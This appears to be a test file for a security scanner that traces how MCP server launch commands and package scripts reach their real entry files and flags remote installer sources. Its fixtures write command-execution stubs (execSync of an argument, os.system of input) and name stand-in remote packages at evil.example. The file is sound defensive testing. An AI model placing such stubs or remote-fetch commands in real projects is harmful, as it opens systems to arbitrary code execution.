import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import type { MCPServerEntry } from './types.js';
import { launchTarget, packageScriptRun, resolveServerSources } from './source-resolver.js';
import { commandWords, scriptCommands, shellWords } from './script-command.js';
import { findArgSecrets } from './config-secrets.js';
import { installSpecs } from '../checks/mcp/mcp-030-untrusted-installer-source.js';

const server = (command: string, args: string[], extra: Partial<MCPServerEntry> = {}): MCPServerEntry =>
  ({ name: 's', command, args, transport: 'stdio', ...extra });
const ENTRY = resolve('/srv/evil.js');

describe('launchTarget: option values per runtime', () => {
  it.each([
    [['--permission', '--allow-fs-read', '/srv/decoy', '/srv/evil.js']],
    [['--experimental-policy', '/srv/policy.json', '/srv/evil.js']],
    [['--disable-proto', 'delete', '/srv/evil.js']],
    [['--heapsnapshot-near-heap-limit', '3', '/srv/evil.js']],
    [['--max-http-header-size', '16384', '/srv/evil.js']],
    [['--trace-event-categories', 'v8', '/srv/evil.js']],
    // an option no table knows, followed by a word that is no script
    [['--some-future-option', 'value', '/srv/evil.js']],
  ])('node %j', (args) => {
    expect(launchTarget(server('node', args)).entry).toBe(ENTRY);
  });

  it('keeps a script-like word after an unknown flag as the entry', () => {
    expect(launchTarget(server('node', ['--enable-source-maps', '/srv/evil.js'])).entry).toBe(ENTRY);
    expect(launchTarget(server('node', ['--no-warnings', 'server'], { cwd: '/srv' })).entry).toBe(resolve('/srv/server'));
  });

  it('python --check-hash-based-pycs and combined short options', () => {
    expect(launchTarget(server('python3', ['--check-hash-based-pycs', 'always', '/srv/s.py'])).entry).toBe(resolve('/srv/s.py'));
    expect(launchTarget(server('python3', ['-uc', 'print(1)'])).note).toMatch(/inline/);
    expect(launchTarget(server('python3', ['-Im', 'pkg.server'], { cwd: '/srv' }))).toMatchObject({ module: 'pkg.server', moduleBase: resolve('/srv') });
  });

  it('fastmcp run past its own options', () => {
    expect(launchTarget(server('fastmcp', ['run', '--transport', 'stdio', '/srv/s.py'])).entry).toBe(resolve('/srv/s.py'));
    expect(launchTarget(server('fastmcp', ['run', '-t', 'stdio', '/srv/s.py:mcp'])).entry).toBe(resolve('/srv/s.py'));
    expect(launchTarget(server('fastmcp', ['run', 'fastmcp.json'])).note).toMatch(/not a Python file/);
  });

  it('bun --cwd <dir> run <script> names the directory, not the option value', () => {
    expect(launchTarget(server('bun', ['--cwd', '/srv/app', 'run', 'start']))).toMatchObject({ packageDir: resolve('/srv/app'), script: 'start' });
  });

  it('npm reads --prefix after the script name; pnpm passes it to the script', () => {
    expect(packageScriptRun(['run', 'start', '--prefix', '/srv/app'], 'npm')).toEqual({ dir: '/srv/app', script: 'start' });
    expect(packageScriptRun(['run', 'start', '--', '--prefix', '/x'], 'npm')).toEqual({ script: 'start' });
    expect(packageScriptRun(['run', 'start', '--dir', '/x'], 'pnpm')).toEqual({ script: 'start' });
  });

  it('a package script with no working directory is noted, not read from the scanner\'s', () => {
    for (const s of [server('bun', ['run', 'start']), server('pnpm', ['--filter', 'x', 'start']), server('npm', ['start']), server('bun', ['--cwd', './srv', 'start'])]) {
      const t = launchTarget(s);
      expect(t.packageDir).toBeUndefined();
      expect(t.note).toMatch(/client's working directory/);
    }
  });

  it('uv run <url> is a remote script', () => {
    expect(launchTarget(server('uv', ['run', 'https://evil.example/server.py'])).note).toMatch(/remote script/);
    expect(installSpecs('uv', ['run', 'https://evil.example/server.py'])).toContain('https://evil.example/server.py');
  });

  it('inline code that only imports a local file names it', () => {
    expect(launchTarget(server('node', ['-e', "import('./evil.js')"], { cwd: '/srv' })).entry).toBe(ENTRY);
    expect(launchTarget(server('node', ['--eval=require("./evil.js")'], { cwd: '/srv' })).entry).toBe(ENTRY);
    expect(launchTarget(server('node', ['-e', "import('./evil.js').then(m => m.run())"])).note).toMatch(/inline/);
  });
});

describe('script-command parsing', () => {
  it('splits commands at unquoted separators and words at unquoted spaces', () => {
    expect(scriptCommands("tsc && node dist/index.js; echo 'a && b' | tee x")).toEqual(['tsc', 'node dist/index.js', "echo 'a && b'", 'tee x']);
    expect(shellWords(`sh -c 'node evil.js' "a b" c\\ d`)).toEqual(['sh', '-c', 'node evil.js', 'a b', 'c d']);
    expect(commandWords('cross-env NODE_ENV=production env -u X FOO=1 node a.js')).toEqual(['node', 'a.js']);
  });

  it('stays linear on long space runs', () => {
    const line = `node${' '.repeat(240_000)}evil.js`;
    const start = Date.now();
    scriptCommands(line);
    shellWords(line);
    expect(Date.now() - start).toBeLessThan(500);
  });
});

describe('resolveServerSources: package scripts', () => {
  let dir: string;
  const EVIL = 'require("child_process").execSync(process.argv[2]); // evil-marker\n';
  const pkg = (name: string, scripts: Record<string, string>, extra: Record<string, string> = {}) => {
    const d = join(dir, name);
    mkdirSync(d, { recursive: true });
    writeFileSync(join(d, 'package.json'), JSON.stringify({ name, main: 'index.js', scripts }));
    writeFileSync(join(d, 'index.js'), 'console.log("benign main");\n');
    writeFileSync(join(d, 'evil.js'), EVIL);
    for (const [f, c] of Object.entries(extra)) writeFileSync(join(d, f), c);
    return d;
  };
  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'vaso-scripts-'));
  });
  afterAll(() => rmSync(dir, { recursive: true, force: true }));

  it.each([
    ['nested npm run', { start: 'npm run serve', serve: 'node evil.js' }],
    ['sh -c', { start: "sh -c 'node evil.js'" }],
    ['inline import', { start: 'node -e "import(\'./evil.js\')"' }],
    ['build step first', { start: 'tsc -p . && cross-env DEBUG=1 node evil.js' }],
    ['bun run', { start: 'bun run evil.js' }],
  ])('follows %s', async (name, scripts) => {
    const d = pkg(name.replace(/\W+/g, '-'), scripts);
    const [src] = await resolveServerSources([server('npm', ['--prefix', d, 'start'])]);
    expect(src.sourceCode).toContain('evil-marker');
  });

  it('honours npm run start --prefix <dir>', async () => {
    const d = pkg('prefix-after', { start: 'node evil.js' });
    const [src] = await resolveServerSources([server('npm', ['run', 'start', '--prefix', d])]);
    expect(src.sourceCode).toContain('evil-marker');
  });

  it('follows deno task to deno.json tasks', async () => {
    const d = pkg('deno-task', {}, { 'deno.json': JSON.stringify({ tasks: { start: 'deno run -A evil.js' } }) });
    const [src] = await resolveServerSources([server('deno', ['task', 'start'], { cwd: d })]);
    expect(src.sourceCode).toContain('evil-marker');
  });

  it('follows python -m to the package\'s own module', async () => {
    const d = pkg('py-m', { start: 'python3 -m tools.server' });
    mkdirSync(join(d, 'tools'));
    writeFileSync(join(d, 'tools', 'server.py'), 'import os\nos.system(input())  # py-marker\n');
    const [src] = await resolveServerSources([server('npm', ['--prefix', d, 'start'])]);
    expect(src.sourceCode).toContain('py-marker');
  });

  it('notes a script it cannot follow instead of reading the package main', async () => {
    for (const [name, scripts] of [
      ['opaque', { start: 'my-server-binary --stdio' }],
      ['cycle', { start: 'npm run serve', serve: 'npm run start' }],
      ['installed-module', { start: 'python3 -m some_installed_pkg' }],
      ['inline-code', { start: 'node -e "require(\'./evil.js\').run(process.env)"' }],
    ] as const) {
      const d = pkg(name, scripts);
      const [src] = await resolveServerSources([server('npm', ['--prefix', d, 'start'])]);
      expect(src.sourceCode, name).toBeUndefined();
      expect(src.unanalyzed, name).toMatch(/package script "(start|serve)"/);
    }
  });

  it('reads only the commands inside the length cap, and says so', async () => {
    const d = pkg('long', { start: `node${' '.repeat(20_000)}evil.js` });
    const [src] = await resolveServerSources([server('npm', ['--prefix', d, 'start'])]);
    expect(src.unanalyzed).toMatch(/longer than 8 KiB/);
    const first = pkg('long-tail', { start: `node evil.js && echo ${'a'.repeat(20_000)}` });
    const [ok] = await resolveServerSources([server('npm', ['--prefix', first, 'start'])]);
    expect(ok.sourceCode).toContain('evil-marker');
  });
});

describe('package-runner arguments', () => {
  it('npx -p <url> is a package, not a password', () => {
    expect(findArgSecrets(['-y', '-p', 'https://evil.example/x.tgz', 'mcp-server'], 'npx')).toEqual([]);
    expect(findArgSecrets(['-uroot', '-p', 'Zx9!kQ2#mW7v'], 'mysql').length).toBeGreaterThan(0);
  });

  it.each([
    ['npm', ['exec', '--yes', 'github:evil/mcp']],
    ['npm', ['x', '-y', 'git+https://evil.example/x.git']],
    ['pnpm', ['dlx', '--package=git+https://evil.example/x.git', 'mcp-server']],
    ['pnpm', ['--package=github:evil/mcp', 'dlx', 'mcp-server']],
  ])('MCP-030 reads the installed package of %s %j', (cmd, args) => {
    expect(installSpecs(cmd, args).some((s) => /git|github:/.test(s))).toBe(true);
  });

  it('npm with a local script installs nothing', () => {
    expect(installSpecs('npm', ['--prefix', '/srv/app', 'start'])).toEqual([]);
  });
});
